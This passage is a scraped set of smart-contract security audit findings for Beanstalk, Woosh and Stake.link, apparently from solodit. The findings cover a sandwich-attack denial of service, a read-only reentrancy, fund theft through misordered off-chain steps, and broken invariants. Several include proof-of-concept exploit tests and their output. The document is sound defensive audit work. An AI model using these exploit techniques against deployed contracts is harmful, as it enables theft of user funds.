        " A call to the BEAN/3CRV Metapool is made withinWeather::sop, swapping Beans for 3CRV, to aid in returning Beanstalk to peg via a mechanism known as \"Flood\" (formerly Season of Plenty, or sop) when the Beanstalk Farm has been \"Oversaturated\" ($P > 1$; $Pod Rate < 5%$) for more than one Season and for each additional Season in which it continues to be Oversaturated. This is achieved by minting additional Beans and selling them directly on Curve, distributing the proceeds from the sale as 3CRV to Stalkholders.",
        "Unlike Oracle::stepOracle, which returns the aggregate time-weighted deltaB value across both the BEAN/3CRV\u00a0Metapool and BEAN/ETH Well, the current shortage/excess of Beans during the handling of Rain in Weather::stepWeather are calculated directly from the Curve Metapool via LibBeanMetaCurve::getDeltaB.",
        "This introduces the possibility that a long-tail MEV bot could perform a denial-of-service attack on the Flood mechanism by performing a sandwich attack on SeasonFacet::gm whenever the conditions are met such that Weather::sop is called. The attacker would first front-run the transaction by selling BEAN for 3CRV, bringing the price of BEAN back to peg, which could result in newBeans <= 0, thus bypassing the subsequent logic, and then back-running to repurchase their sold BEAN effectively maintaining the price of BEAN above peg.",
        "The cost for performing this attack is 0.08% of the utilized funds. However, not accounting for other mechanisms (such as Convert) designed to return the price of Bean to peg, Beanstalk would need to wait the Season duration of 1 hour before making another effective SeasonFacet::gm, provided that the previous transaction did not revert. In the subsequent call, the attacker can replicate this action at the same cost, and it is possible that the price of BEAN may have increased further during this hour."
    ],
    "Impact": [
        " Attempts by Beanstalk to restore peg via the Flood mechanism are susceptible to denial-of-service attacks by a sufficiently well-funded sandwich attacker through frontrunning of SeasonFacet::gm."
    ],
    "Recommended Mitigation": [
        " Consider the use of an oracle to determine how many new Beans should be minted and sold for 3CRV. This implies the following modification:",
        "The motivation for using the maximum value between the current deltaB and that calculated from time-weighted average balances is that the action of an attacker increasing deltaB to carry out a sandwich attack would be nonsensical as excess Bean minted by the Flood mechanism would be sold for additional 3CRV. In this way, anyone attempting to increase deltaB would essentially be giving away their 3CRV LP tokens to Stalkholders. Therefore, by using the maximum deltaB, it is ensured that the impact of any attempt to execute the attack described above would be minimal and economically unattractive. If no one attempts the attack, the behavior will remain as originally intended.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/use-call-instead-of-transfer-cyfrin-none-woosh-deposit-vault-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " In both of the withdraw functions, transfer() is used for native ETH withdrawal.\nThe transfer() and send() functions forward a fixed amount of 2300 gas. Historically, it has often been recommended to use these functions for value transfers to guard against reentrancy attacks. However, the gas cost of EVM instructions may change significantly during hard forks which may break already deployed contract systems that make fixed assumptions about gas costs. For example. EIP 1884 broke several existing smart contracts due to a cost increase of the SLOAD instruction."
    ],
    "Impact": [
        " The use of the deprecated transfer() function for an address will inevitably make the transaction fail when:",
        "Additionally, using higher than 2300 gas might be mandatory for some multisig wallets."
    ],
    "Recommended Mitigation": [
        " Use call() instead of transfer()."
    ],
    "Protocol": [
        "\nAgree, transfer was causing issues with smart contract wallets."
    ],
    "Cyfrin": [
        " Verified in commit 7726ae7."
    ]
}
----End JSON----

https://solodit.xyz/issues/non-standard-erc20-tokens-are-not-supported-cyfrin-none-woosh-deposit-vault-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "DepositVault.sol\n37:     function deposit(uint256 amount, address tokenAddress) public payable {\n38:         require(amount > 0 || msg.value > 0, \"Deposit amount must be greater than 0\");\n39:         if(msg.value > 0) {\n40:             require(tokenAddress == address(0), \"Token address must be 0x0 for ETH deposits\");\n41:             uint256 depositIndex = deposits.length;\n42:             deposits.push(Deposit(payable(msg.sender), msg.value, tokenAddress));\n43:             emit DepositMade(msg.sender, depositIndex, msg.value, tokenAddress);\n44:         } else {\n45:             require(tokenAddress != address(0), \"Token address must not be 0x0 for token deposits\");\n46:             IERC20 token = IERC20(tokenAddress);\n47:             token.safeTransferFrom(msg.sender, address(this), amount);\n48:             uint256 depositIndex = deposits.length;\n49:             deposits.push(Deposit(payable(msg.sender), amount, tokenAddress));//@audit-issue fee-on-transfer, rebalancing tokens will cause problems\n50:             emit DepositMade(msg.sender, depositIndex, amount, tokenAddress);\n51:\n52:         }\n53:     }\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " The protocol implemented a function deposit() to allow users to deposit.",
        "Looking at the line L49, we can see that the protocol assumes amount of tokens were transferred.\nBut this does not hold true for some non-standard ERC20 tokens like fee-on-transfer tokens or rebalancing tokens.\n(Refer to here about the non-standard weird ERC20 tokens)",
        "For example, if token incurs fee on transfer, the actually transferred amount will be less than the provided parameter amount and the deposits will have a wrong state value. Because the current implementation only allows full withdrawal, this means the tokens will be locked in the contract permanently."
    ],
    "Impact": [
        " If non-standard ERC20 tokens are used, the tokens could be locked in the contract permanently."
    ],
    "Recommended Mitigation": [
        ""
    ],
    "Protocol": [
        "\nContract updated to support non-standard ERC-20 tokens. We've decided to not allow users to partially withdraw since it would complicate the logic of the signatures, as of now only full withdraws can be executed."
    ],
    "Cyfrin": [
        " Verified in commit 405fa78."
    ]
}
----End JSON----

https://solodit.xyz/issues/the-off-chain-mechanism-must-be-ensured-to-work-in-a-correct-order-strictly-cyfrin-none-cyfrin-stake-link-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  it('Cyfrin: off-chain mechanism in an incorrect order can lead to user funds being stolen', async () => {\n    // try deposit 1500 while the capacity is 1000\n    await strategy.setMaxDeposits(toEther(1000))\n    await sq.connect(signers[1]).deposit(toEther(1500), true)\n\n    // 500 ether is queued for accounts[1]\n    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1000)\n    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 500)\n    assert.equal(fromEther(await token.balanceOf(accounts[1])), 8500)\n\n    // unqueue 500 ether should work while no updateDistribution was called\n    await sq.connect(signers[1]).unqueueTokens(0, 0, [], toEther(500))\n    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 0)\n    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)\n\n    // deposit again\n    await sq.connect(signers[1]).deposit(toEther(500), true)\n    assert.equal(fromEther(await token.balanceOf(accounts[1])), 8500)\n\n    // victim deposits 500 ether and it will be queued\n    await sq.connect(signers[2]).deposit(toEther(500), true)\n    assert.equal(fromEther(await sq.totalQueued()), 1000)\n\n    // max deposit has increased to 1500\n    await strategy.setMaxDeposits(toEther(1500))\n\n    // user sees that his queued tokens 500 can be deposited and call depositQueuedTokens\n    // this will deposit the 500 ether in the queue\n    await sq.connect(signers[1]).depositQueuedTokens()\n\n    // Correct off-chain mechanism: pauseForUpdate -> getAccountData -> updateDistribution\n    // Let us see what happens if getAccountData is called before pauseForUpdate\n\n    // await sq.pauseForUpdate()\n\n    // check account data\n    var a_data = await sq.getAccountData()\n    assert.equal(ethers.utils.formatEther(a_data[2][1]), \"500.0\")\n    assert.equal(ethers.utils.formatEther(a_data[2][2]), \"500.0\")\n\n    // user calls unqueueTokens to get his 500 ether back\n    // this is possible because the queue contract is not paused\n    await sq.connect(signers[1]).unqueueTokens(0, 0, [], toEther(500))\n\n    // pauseForUpdate is called at a wrong order\n    await sq.pauseForUpdate()\n\n    // at this point user has 1000 ether staked and 9000 ether in his wallet\n    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)\n    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1000)\n\n    // now updateDistribution is called with the wrong data\n    let data = [\n      [ethers.constants.AddressZero, toEther(0), toEther(0)],\n      [accounts[1], toEther(500), toEther(500)],\n    ]\n    let tree = StandardMerkleTree.of(data, ['address', 'uint256', 'uint256'])\n\n    await sq.updateDistribution(\n      tree.root,\n      ethers.utils.formatBytes32String('ipfs'),\n      toEther(500),\n      toEther(500)\n    )\n\n    // at this point user claims his LSD tokens\n    await sq.connect(signers[1]).claimLSDTokens(toEther(500), toEther(500), tree.getProof(1))\n\n    // at this point user has 1500 ether staked and 9000 ether in his wallet\n    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)\n    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1500)\n  })\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " The PriorityPool contract relies on the distribution oracle for accounting and the accounting calculation is done off-chain.",
        "According to the communication with the protocol team, the correct workflow for queued deposits can be described as below:",
        "The only purpose of pausing the queue contract is to prevent unqueue until the accounting status are updated.\nThrough an analysis we found that the off-chain mechanism MUST follow the order very strictly or else user funds can be stolen.\nWhile we acknowledge that the protocol team will ensure it, we decided to keep this finding as a medium risk because we can not verify the off-chain mechanism."
    ],
    "Impact": [
        " If the off-chain mechanism occurs in a wrong order by any chance, user funds can be stolen.\nGiven the likelihood is low, we evaluate the impact to be Medium."
    ],
    "Proof of Concept": [
        " The below test case shows the attack scenario."
    ],
    "Recommended Mitigation": [
        " Consider to force pause the contract at the end of the function _depositQueuedTokens."
    ],
    "Client": [
        "\nAcknowledged. The protocol team will ensure the correct order of the off-chain mechanism."
    ],
    "Cyfrin": [
        " Acknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/users-funds-are-locked-temporarily-in-the-prioritypool-contract-cyfrin-none-cyfrin-stake-link-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "function withdraw(uint256 _amount) external {//@audit-info LSD token\n    if (_amount == 0) revert InvalidAmount();\n    IERC20Upgradeable(address(stakingPool)).safeTransferFrom(msg.sender, address(this), _amount);//@audit-info get LSD token from the user\n    _withdraw(msg.sender, _amount);\n}\n",
        "function _withdraw(address _account, uint256 _amount) internal {\n    if (poolStatus == PoolStatus.CLOSED) revert WithdrawalsDisabled();\n\n    uint256 toWithdrawFromQueue = _amount <= totalQueued ? _amount : totalQueued;//@audit-info if the queue is not empty, we use that first\n    uint256 toWithdrawFromPool = _amount - toWithdrawFromQueue;\n\n    if (toWithdrawFromQueue != 0) {\n        totalQueued -= toWithdrawFromQueue;\n        depositsSinceLastUpdate += toWithdrawFromQueue;//@audit-info regard this as a deposit via the queue\n    }\n\n    if (toWithdrawFromPool != 0) {\n        stakingPool.withdraw(address(this), address(this), toWithdrawFromPool);//@audit-info withdraw from pool into this contract\n    }\n\n    //@audit-warning at this point, toWithdrawFromQueue of LSD tokens remain in this contract!\n\n    token.safeTransfer(_account, _amount);//@audit-info\n    emit Withdraw(_account, toWithdrawFromPool, toWithdrawFromQueue);\n}\n",
        " it('Cyfrin: user funds can be locked temporarily', async () => {\n    // try deposit 1500 while the capacity is 1000\n    await strategy.setMaxDeposits(toEther(1000))\n    await sq.connect(signers[1]).deposit(toEther(1500), true)\n\n    // 500 ether is queued for accounts[1]\n    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1000)\n    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 500)\n    assert.equal(fromEther(await token.balanceOf(accounts[1])), 8500)\n    assert.equal(fromEther(await sq.totalQueued()), 500)\n    assert.equal(fromEther(await stakingPool.balanceOf(sq.address)), 0)\n\n    // at this point user calls withdraw (maybe by mistake?)\n    // withdraw swipes from the queue and the deposit room stays at zero\n    await stakingPool.connect(signers[1]).approve(sq.address, toEther(500))\n    await sq.connect(signers[1]).withdraw(toEther(500))\n\n    // at this point getQueueTokens[accounts[1]] does not change but the queue is empty\n    // user will think his queue position did not change and he can simply unqueue\n    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 500)\n    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 500)\n    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)\n    assert.equal(fromEther(await sq.totalQueued()), 0)\n    // NOTE: at this point 500 ethers of LSD tokens are locked in the queue contract\n    assert.equal(fromEther(await stakingPool.balanceOf(sq.address)), 500)\n\n    // but unqueueTokens fails because actual totalQueued is zero\n    await expect(sq.connect(signers[1]).unqueueTokens(0, 0, [], toEther(500))).to.be.revertedWith(\n      'InsufficientQueuedTokens()'\n    )\n\n    // user's LSD tokens are still locked in the queue contract\n    await stakingPool.connect(signers[1]).approve(sq.address, toEther(500))\n    await sq.connect(signers[1]).withdraw(toEther(500))\n    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 0)\n    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 500)\n    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9500)\n    assert.equal(fromEther(await sq.totalQueued()), 0)\n    assert.equal(fromEther(await stakingPool.balanceOf(sq.address)), 500)\n\n    // user might try withdraw again but it will revert because user does not have any LSD tokens\n    await stakingPool.connect(signers[1]).approve(sq.address, toEther(500))\n    await expect(sq.connect(signers[1]).withdraw(toEther(500))).to.be.revertedWith(\n      'Transfer amount exceeds balance'\n    )\n\n    // in conclusion, user's LSD tokens are locked in the queue contract and he cannot withdraw them\n    // it is worth noting that the locked LSD tokens are credited once updateDistribution is called\n    // so the lock is temporary\n  })\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " The protocol intended to utilize the deposit queue for withdrawal to minimize the stake/unstake interaction with the staking pool.\nWhen a user wants to withdraw, they are supposed to call the function PriorityPool::withdraw() with the desired amount as a parameter.",
        "As we can see in the implementation, the protocol pulls the _amount of LSD tokens from the user first and then calls _withdraw() where the actual withdrawal utilizing the queue is processed.",
        "But looking in the function _withdraw(), only toWithdrawFromPool amount of LSD tokens are withdrawn (burn) from the staking pool and toWithdrawFromQueue amount of LSD tokens remain in the PriorityPool contract.\nOn the other hand, the contract tracks the queued amount for users by the mapping accountQueuedTokens and this leads to possible mismatch in the accounting.\nDue to this mismatch, a user's LSD tokens can be locked in the PriorityPool contract while the user sees his queued amount (getQueuedTokens()) is positive.\nUsers can claim the locked LSD tokens once the function updateDistribution is called.\nThrough the communication with the protocol team, it is understood that updateDistribution is expected to be called probably every 1-2 days unless there were any new deposits into the staking pool.\nSo it means user's funds can be locked temporarily in the contract which is unfair for the user."
    ],
    "Impact": [
        " User's LSD tokens can be locked temporarily in the PriorityPool contract"
    ],
    "Proof of Concept": [
        ""
    ],
    "Recommended Mitigation": [
        " Consider add a feature to allow users to withdraw LSD tokens from the contract directly."
    ],
    "Client": [
        "\nFixed in this PR."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/read-only-reentrancy-cyfrin-beanstalk-wells-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "// MockCallbackRecipient.sol\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.17;\n\nimport {console} from \"forge-std/Test.sol\";\n\ncontract MockCallbackRecipient {\n    fallback() external payable {\n        console.log(\"here\");\n        (bool success, bytes memory result) = msg.sender.call(abi.encodeWithSignature(\"getReserves()\"));\n        if (success) {\n            uint256[] memory reserves = abi.decode(result, (uint256[]));\n            console.log(\"read-only-reentrancy beforeTokenTransfer reserves[0]: %s\", reserves[0]);\n            console.log(\"read-only-reentrancy beforeTokenTransfer reserves[1]: %s\", reserves[1]);\n        }\n    }\n}\n\n// NOTE: Put in Exploit.t.sol\nfunction test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken() public {\n    IERC20 callbackToken = IERC20(new MockCallbackToken(\"CallbackToken\", \"CBTKN\", 18));\n    MockToken(address(callbackToken)).mint(user, 1000e18);\n    IERC20[] memory _tokens = new IERC20[](2);\n    _tokens[0] = callbackToken;\n    _tokens[1] = tokens[1];\n\n    vm.stopPrank();\n    Well well2 = Well(auger.bore(\"Well2\", \"WELL2\", _tokens, wellFunction, pumps));\n    approveMaxTokens(user, address(well2));\n\n    uint[] memory amounts = new uint[](2);\n    amounts[0] = 100 * 1e18;\n    amounts[1] = 100 * 1e18;\n\n    changePrank(user);\n    callbackToken.approve(address(well2), type(uint).max);\n    uint256 lpAmountOut = well2.addLiquidity(amounts, 0, user);\n\n    well2.removeLiquidity(lpAmountOut, amounts, user);\n}\n",
        "forge test -vv --match-test test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken\n\n[PASS] test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken() (gas: 5290876)\nLogs:\n  read-only-reentrancy beforeTokenTransfer reserves[0]: 0\n  read-only-reentrancy beforeTokenTransfer reserves[1]: 0\n  read-only-reentrancy afterTokenTransfer reserves[0]: 0\n  read-only-reentrancy afterTokenTransfer reserves[1]: 0\n  read-only-reentrancy beforeTokenTransfer reserves[0]: 100000000000000000000\n  read-only-reentrancy beforeTokenTransfer reserves[1]: 100000000000000000000\n  read-only-reentrancy afterTokenTransfer reserves[0]: 100000000000000000000\n  read-only-reentrancy afterTokenTransfer reserves[1]: 100000000000000000000\n\nTest result: ok. 1 passed; 0 failed; finished in 3.66ms\n"
    ],
    "Description": [
        " The current implementation is vulnerable to read-only reentrancy, especially in Wells::removeLiquidity.\nThe implementation does not strictly follow the Checks-Effects-Interactions (CEI) pattern as it is setting the new reserve values after sending out the tokens. This is not an immediate risk to the protocol itself due to the nonReentrant modifier, but this is still vulnerable to read-only reentrancy.",
        "Malicious attackers and unsuspecting ecosystem participants can deploy Wells with ERC-777 tokens (which have a callback that can take control) and exploit this vulnerability. This will lead to critical vulnerabilities given that the Wells are to be extended with price functions as defined by pumps - third-party protocols that integrate these on-chain oracles will be at risk.",
        "Pumps are updated before token transfers; however, reserves are only set after. Therefore, pump functions will likely be incorrect on a re-entrant read-only call if IWell(well).getReserves() is called but reserves have not been correctly updated. The implementation of GeoEmaAndCumSmaPump appears not to be vulnerable, but given that each pump can choose its approach for recording a well's reserves over time, this remains a possible attack vector."
    ],
    "Impact": [
        " Although this is not an immediate risk to the protocol itself, read-only re-entrancy can lead to critical issues, so we evaluate the severity as HIGH."
    ],
    "Proof of Concept": [
        " We wrote a test case to show the existing read-only reentrancy.",
        "The output is shown below."
    ],
    "Recommended Mitigation": [
        " Implement the CEI pattern in relevant functions by updating reserves before making external calls. For example, the function Well::removeLiquidity can be modified shown below."
    ],
    "Beanstalk": [
        " Added a check to the getReserves() function that reverts if the Reentrancy guard has been entered. This prevents anyone from calling getReserves() while executing a function in the Well. Fixed in commit fcbf04a."
    ],
    "Cyfrin": [
        " Acknowledged.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/protocols-invariants-can-be-broken-cyfrin-beanstalk-wells-markdown_
--------------------------------------------------
----Start JSON----
{
    "code": [
        "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.17;\n\nimport {IERC20} from \"test/TestHelper.sol\";\nimport {IWellFunction} from \"src/functions/ConstantProduct2.sol\";\nimport {LiquidityHelper} from \"test/LiquidityHelper.sol\";\nimport \"forge-std/Test.sol\";\nimport {MockToken} from \"mocks/tokens/MockToken.sol\";\n\ncontract GetRemoveLiquidityOneTokenOutArithmeticFail is LiquidityHelper {\n    function setUp() public {\n        setupWell(2);\n    }\n\n    address internal constant ADDRESS_0 = 0x0000000000000000000000000000000000001908;\n    address internal constant ADDRESS_1 = 0xffffFFFfFFffffffffffffffFfFFFfffFFFfFFfE;\n    address internal constant ADDRESS_2 = 0x0000000000000000000000000000000000000001;\n    address internal constant ADDRESS_3 = 0x00000011EF7b76c418fC426B8707dC60c8404f4a;\n\n    // Failing unit tests from invariant results\n    function test_getRemoveLiquidityOneTokenOutArithmeticFail() public {\n        showStatus();\n\n        address msgSender = ADDRESS_0;\n        _addLiquidity(msgSender, 77_470_052_844_788_801_811_950_156_551, 17_435);\n        _removeLiquidityOneTokenOut(msgSender, 5267, 0);\n        showStatus();\n\n        msgSender = ADDRESS_1;\n        _addLiquidity(msgSender, 79_228_162_514_264_337_593_543_950_335, 0);\n        _removeLiquidity(msgSender, 2_025_932_259_663_320_959_193_637_370_794);\n        showStatus();\n\n        msgSender = ADDRESS_2;\n        _addLiquidity(msgSender, 69_069_904_726_099_247_337_000_262_288, 3);\n        showStatus();\n\n        msgSender = ADDRESS_1;\n        _transferLp(msgSender, ADDRESS_3, 1_690_276_116_468_540_706_301_324_542_928);\n        emit log_named_uint(\"LP Balance (1)\", well.balanceOf(ADDRESS_1));\n        emit log_named_uint(\"LP Balance (3)\", well.balanceOf(ADDRESS_3));\n        showStatus();\n\n        msgSender = ADDRESS_0;\n        emit log_string(\"removeLiquidity\");\n        _removeLiquidity(msgSender, 122_797_404_990_851_137_316_041_024_188);\n        showStatus();\n\n        msgSender = ADDRESS_3;\n        emit log_string(\"removeLiquidityOneToken\");\n        _removeLiquidityOneTokenOut(msgSender, 1_690_276_116_468_540_706_301_000_000_000, 1);\n        emit log_named_uint(\"LP Balance (3)\", well.balanceOf(ADDRESS_3));\n        showStatus();\n        // The next line fails with an under/overflow error\n        //\n        // CONTEXT: In the previous operation, ADDRESS_3 removes the vast majority of his LP position\n        // for token[1]. At this point the token balances of the well are as follows:\n        //  * token[0].balanceOf(well) = 198508852592404865716451834587\n        //  * token[1].balanceOf(well) =          625986797429655048967\n        // The next operation ADDRESS_3 calls is removeLiquidityOneTokenOut() for token[0] using his\n        // remaining LP position. The amount of LP tokens he has left is 3. Line 526 reverts with underflow,\n        // despite all operations being completely valid. How severe is this?\n        _removeLiquidityOneTokenOut(msgSender, 324_542_928, 0);\n        showStatus();\n    }\n\n    function test_audit() public {\n        address msgSender = address(this);\n        _removeLiquidityOneTokenOut(msgSender, 1e16, 0);\n        _removeLiquidity(msgSender, well.balanceOf(msgSender) - 1);\n        _removeLiquidity(msgSender, 1);\n    }\n\n    function test_totalSupplyInvariantSwapFail() public {\n        address msgSender = 0x576024f76bd1640d7399a5B5F61530f997Ae06f2;\n        changePrank(msgSender);\n        IERC20[] memory mockTokens = well.tokens();\n        uint tokenInIndex = 0;\n        uint tokenOutIndex = 1;\n        uint tokenInAmount = 52_900_000_000_000_000_000;\n        MockToken(address(mockTokens[tokenInIndex])).mint(msgSender, tokenInAmount);\n        mockTokens[tokenInIndex].approve(address(well), tokenInAmount);\n        uint minAmountOut = well.getSwapOut(mockTokens[tokenInIndex], mockTokens[tokenOutIndex], tokenInAmount);\n        well.swapFrom(\n            mockTokens[tokenInIndex], mockTokens[tokenOutIndex], tokenInAmount, minAmountOut, msgSender, block.timestamp\n        );\n        // check the total supply\n        uint functionCalc =\n            IWellFunction(well.wellFunction().target).calcLpTokenSupply(well.getReserves(), well.wellFunction().data);\n        // assertEq(well.totalSupply(), functionCalc);\n        showStatus();\n    }\n\n    function _transferLp(address msgSender, address to, uint amount) private {\n        changePrank(msgSender);\n        well.transfer(to, amount);\n    }\n\n    function _removeLiquidityOneTokenOut(\n        address msgSender,\n        uint lpAmountIn,\n        uint tokenIndex\n    ) private returns (uint tokenAmountOut) {\n        changePrank(msgSender);\n        IERC20[] memory mockTokens = well.tokens();\n        uint minTokenAmountOut = well.getRemoveLiquidityOneTokenOut(lpAmountIn, mockTokens[tokenIndex]);\n        tokenAmountOut = well.removeLiquidityOneToken(\n            lpAmountIn, mockTokens[tokenIndex], minTokenAmountOut, msgSender, block.timestamp\n        );\n    }\n\n    function _removeLiquidity(address msgSender, uint lpAmountIn) private returns (uint[] memory tokenAmountsOut) {\n        changePrank(msgSender);\n        uint[] memory minTokenAmountsOut = well.getRemoveLiquidityOut(lpAmountIn);\n        tokenAmountsOut = well.removeLiquidity(lpAmountIn, minTokenAmountsOut, msgSender, block.timestamp);\n    }\n\n    function _addLiquidity(\n        address msgSender,\n        uint token0Amount,\n        uint token1Amount\n    ) private returns (uint lpAmountOut) {\n        changePrank(msgSender);\n        uint[] memory tokenAmountsIn = _mintToSender(msgSender, token0Amount, token1Amount);\n        uint minLpAmountOut = well.getAddLiquidityOut(tokenAmountsIn);\n\n        lpAmountOut = well.addLiquidity(tokenAmountsIn, minLpAmountOut, msgSender, block.timestamp);\n    }\n\n    function _mintToSender(\n        address msgSender,\n        uint token0Amount,\n        uint token1Amount\n    ) private returns (uint[] memory tokenAmountsIn) {\n        changePrank(msgSender);\n        IERC20[] memory mockTokens = well.tokens();\n        MockToken(address(mockTokens[0])).mint(msgSender, token0Amount);\n        MockToken(address(mockTokens[1])).mint(msgSender, token1Amount);\n\n        tokenAmountsIn = new uint[](2);\n        tokenAmountsIn[0] = token0Amount;\n        tokenAmountsIn[1] = token1Amount;\n\n        mockTokens[0].approve(address(well), token0Amount);\n        mockTokens[1].approve(address(well), token1Amount);\n    }\n\n    function showStatus() public {\n        IERC20[] memory mockTokens = well.tokens();\n        uint[] memory reserves = well.getReserves();\n\n        uint calcedSupply = IWellFunction(well.wellFunction().target).calcLpTokenSupply(well.getReserves(), well.wellFunction().data);\n        emit log_named_uint(\"Total  LP Supply\", well.totalSupply());\n        emit log_named_uint(\"Calced LP Supply\", calcedSupply);\n    }\n}\n",
        "Running 1 test for test/invariant/RemoveOneLiquidity.t.sol:GetRemoveLiquidityOneTokenOutArithmeticFail\n[FAIL. Reason: Arithmetic over/underflow] test_getRemoveLiquidityOneTokenOutArithmeticFail() (gas: 1029158)\nLogs:\n  Total  LP Supply: 1000000000000000000000000000\n  Calced LP Supply: 1000000000000000000000000000\n  Total  LP Supply: 8801707439172742871919189288925\n  Calced LP Supply: 8801707439172742871919189288909\n  Total  LP Supply: 10491983555641283578220513831854\n  Calced LP Supply: 10491983555641283578222260432821\n  Total  LP Supply: 12960446346289240477619201802843\n  Calced LP Supply: 12960446346289240477619201802843\n  LP Balance (1): 1\n  LP Balance (3): 1690276116468540706301324542928\n  Total  LP Supply: 12960446346289240477619201802843\n  Calced LP Supply: 12960446346289240477619201802843\n  removeLiquidity\n  Total  LP Supply: 12837648941298389340303160778655\n  Calced LP Supply: 12837648941298389340310429464350\n  removeLiquidityOneToken\n  LP Balance (3): 324542928\n  Total  LP Supply: 11147372824829848634002160778655\n  Calced LP Supply: 11147372824829848633998681214926\n\nTest result: FAILED. 0 passed; 1 failed; finished in 3.70ms\n\nFailing tests:\nEncountered 1 failing test in test/invariant/RemoveOneLiquidity.t.sol:GetRemoveLiquidityOneTokenOutArithmeticFail\n[FAIL. Reason: Arithmetic over/underflow] test_getRemoveLiquidityOneTokenOutArithmeticFail() (gas: 1029158)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n"
    ],
    "Description": [
        " The protocol intends to provide a generalized framework for constant-function AMM liquidity pools.\nWe have identified some invariants that should hold at any given time. One of these invariants is totalSupply() == calcLpTokenSupply(reserves), and we can interpret this as the pool's total LP supply should match the calculation of LP from the current reserves state values.",
        "This invariant can be broken with valid transactions in the current implementation, leading to several problems. For example, valid liquidity removal might revert, as shown in the PoC test below."
    ],
    "Impact": [
        " The impact is HIGH because this discrepancy will lead to protocol insolvency (revert on valid transactions)."
    ],
    "Proof of Concept": [
        "",
        "The test results are shown below.",
        "Looking into this, the ConstantProduct2, we see three problems:",
        "Let us assume totalSupply() == calcLpTokenSupply(reserves) == T0 before the transaction. After the transaction, the total supply will be T0 - lpAmountIn. The output token amount is calculated as getRemoveLiquidityOneTokenOut(lpAmountIn, 0, reserves) = reserves[0] - calcReserve(reserves, 0, T0 - lpAmountIn). After the transaction, the calculated total supply will be calcLpTokenSupply([calcReserve(reserves, 0, T0 - lpAmountIn), reserves[1]]). For the invariant to hold after the transaction, the functions ConstantProduct2::calcLpTokenSupply and ConstantProduct2::calcReserve should exhibit an accurate inverse relationship (calcLpTokenSupply(calcReserves(reserves, LP)) == LP). In practice, all calculations come with rounding to some extent, and this relationship is not possible so long as the two functions are implemented separately."
    ],
    "Recommended Mitigation": [
        "",
        "Please note that well.getReserves()[i] == wellFunction.calcReserve(i) is also supposed to hold.\nBecause of the rounding in the calculation, we understand this invariant might be too strict and similar mitigation is recommended.\nBelow is a test to show that the above invariant can be broken."
    ],
    "Beanstalk": [
        ""
    ],
    "Cyfrin": [
        " Acknowledged and validated changes mitigate the original issue."
    ]
}
----End JSON----

https://solodit.xyz/issues/each-well-is-responsible-for-ensuring-that-an-update-call-cannot-be-made-with-a-reserve-of-0-cyfrin-beanstalk-wells-markdown_
--------------------------------------------------
----Start JSON----
{
    "code": [
        "/**\n * @title GeoEmaAndCumSmaPump\n * @author Publius\n * @notice Stores a geometric EMA and cumulative geometric SMA for each reserve.\n * @dev A Pump designed for use in Beanstalk with 2 tokens.\n *\n * This Pump has 3 main features:\n *  1. Multi-block MEV resistence reserves\n *  2. MEV-resistant Geometric EMA intended for instantaneous reserve queries\n *  3. MEV-resistant Cumulative Geometric intended for SMA reserve queries\n *\n * Note: If an `update` call is made with a reserve of 0, the Geometric mean oracles will be set to 0.\n * Each Well is responsible for ensuring that an `update` call cannot be made with a reserve of 0.\n */\n",
        "GeoEmaAndCumSmaPump.sol\n103:         for (uint i; i < length; ++i) {\n104:             // Use a minimum of 1 for reserve. Geometric means will be set to 0 if a reserve is 0.\n105:             b.lastReserves[i] =\n106:                 _capReserve(b.lastReserves[i], (reserves[i] > 0 ? reserves[i] : 1).fromUIntToLog2(), blocksPassed);\n107:             b.emaReserves[i] = b.lastReserves[i].mul((ABDKMathQuad.ONE.sub(aN))).add(b.emaReserves[i].mul(aN));\n108:             b.cumulativeReserves[i] = b.cumulativeReserves[i].add(b.lastReserves[i].mul(deltaTimestampBytes));\n109:         }\n",
